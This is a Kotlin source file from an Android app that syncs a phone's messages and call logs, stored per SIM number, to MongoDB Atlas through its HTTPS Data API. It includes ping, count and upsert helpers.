package com.calltech

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.Date

/**
 * Phone → seedha MongoDB Atlas (HTTPS Data API).
 * PC / hotspot ki zarurat nahi — sirf mobile data.
 */
object AtlasDataApiSync {
    private const val TAG = "AtlasDataApiSync"
    private const val TIMEOUT_MS = 45000

    fun isConfigured(): Boolean {
        return BuildConfig.ATLAS_DATA_APP_ID.isNotBlank() &&
            BuildConfig.ATLAS_DATA_API_KEY.isNotBlank()
    }

    private fun actionUrl(action: String): String {
        val appId = BuildConfig.ATLAS_DATA_APP_ID.trim()
        val region = BuildConfig.ATLAS_DATA_REGION.trim()
        val host = if (region.isNotBlank()) {
            "https://$region.aws.data.mongodb-api.com/app/$appId/endpoint/data/v1/action/$action"
        } else {
            "https://data.mongodb-api.com/app/$appId/endpoint/data/v1/action/$action"
        }
        return host
    }

    fun ping(): Boolean {
        if (!isConfigured()) {
            return false
        }

        return try {
            val payload = JSONObject().apply {
                put("dataSource", dataSource())
                put("database", SimNumberHelper.databaseName("0000000000"))
                put("collection", "messages")
                put("filter", JSONObject())
                put("limit", 1)
            }
            postJson(actionUrl("find"), payload)
            true
        } catch (error: Exception) {
            Log.e(TAG, "ping failed", error)
            false
        }
    }

    fun getStats(simNumber: String): Triple<Boolean, Int, Int> {
        if (!isConfigured()) {
            return Triple(false, 0, 0)
        }

        return try {
            val dbName = SimNumberHelper.databaseName(simNumber)
            val messages = countCollection(dbName, SimNumberHelper.messagesCollection(simNumber))
            val calls = countCollection(dbName, SimNumberHelper.callLogsCollection(simNumber))
            Triple(true, messages, calls)
        } catch (error: Exception) {
            Log.e(TAG, "getStats failed", error)
            Triple(false, 0, 0)
        }
    }

    fun upsertMessages(simNumber: String, messages: List<Map<String, Any>>): Boolean {
        return upsertDocuments(
            SimNumberHelper.databaseName(simNumber),
            SimNumberHelper.messagesCollection(simNumber),
            messages,
        )
    }

    fun upsertCallLogs(simNumber: String, callLogs: List<Map<String, Any>>): Boolean {
        return upsertDocuments(
            SimNumberHelper.databaseName(simNumber),
            SimNumberHelper.callLogsCollection(simNumber),
            callLogs,
        )
    }

    private fun upsertDocuments(database: String, collection: String, items: List<Map<String, Any>>): Boolean {
        if (items.isEmpty()) {
            return true
        }
        if (!isConfigured()) {
            return false
        }

        val now = Date().time
        var saved = 0

        items.forEach { item ->
            val id = item["id"]?.toString() ?: return@forEach
            val doc = mapToJson(item)
            doc.put("id", id)
            doc.put("syncedAt", now)

            val payload = JSONObject().apply {
                put("dataSource", dataSource())
                put("database", database)
                put("collection", collection)
                put("filter", JSONObject().put("id", id))
                put("update", JSONObject().put("\$set", doc))
                put("upsert", true)
            }

            try {
                postJson(actionUrl("updateOne"), payload)
                saved++
            } catch (error: Exception) {
                Log.e(TAG, "upsert $collection id=$id failed", error)
                return false
            }
        }

        Log.d(TAG, "Atlas Data API saved $saved in $database.$collection")
        return saved > 0
    }

    private fun countCollection(database: String, collection: String): Int {
        val payload = JSONObject().apply {
            put("dataSource", dataSource())
            put("database", database)
            put("collection", collection)
            put("pipeline", JSONArray().put(JSONObject().put("\$count", "total")))
        }

        val response = postJson(actionUrl("aggregate"), payload)
        val documents = response.optJSONArray("documents")
        if (documents != null && documents.length() > 0) {
            return documents.getJSONObject(0).optInt("total", 0)
        }
        return 0
    }

    private fun dataSource(): String {
        val source = BuildConfig.ATLAS_DATA_SOURCE.trim()
        return source.ifBlank { "Cluster0" }
    }

    private fun postJson(url: String, body: JSONObject): JSONObject {
        var connection: HttpURLConnection? = null

        try {
            connection = (URL(url).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                connectTimeout = TIMEOUT_MS
                readTimeout = TIMEOUT_MS
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                setRequestProperty("Accept", "application/json")
                setRequestProperty("api-key", BuildConfig.ATLAS_DATA_API_KEY.trim())
            }

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(body.toString())
                writer.flush()
            }

            val stream = if (connection.responseCode in 200..299) {
                connection.inputStream
            } else {
                connection.errorStream
            }

            val responseBody = BufferedReader(InputStreamReader(stream)).use { it.readText() }
            val json = JSONObject(responseBody.ifBlank { "{}" })

            if (connection.responseCode !in 200..299) {
                throw IllegalStateException(
                    json.optString("error", "HTTP ${connection.responseCode}"),
                )
            }

            return json
        } finally {
            connection?.disconnect()
        }
    }

    private fun mapToJson(map: Map<String, Any>): JSONObject {
        val json = JSONObject()
        map.forEach { (key, value) ->
            if (key == "_id") {
                return@forEach
            }
            json.put(key, toJsonValue(value))
        }
        return json
    }

    private fun toJsonValue(value: Any?): Any {
        return when (value) {
            null -> JSONObject.NULL
            is Int -> value.toLong()
            is Float -> value.toDouble()
            is Map<*, *> -> {
                val nested = JSONObject()
                value.forEach { (k, v) ->
                    if (k is String) {
                        nested.put(k, toJsonValue(v))
                    }
                }
                nested
            }
            is List<*> -> {
                val array = JSONArray()
                value.forEach { item ->
                    array.put(toJsonValue(item))
                }
                array
            }
            else -> value
        }
    }
}
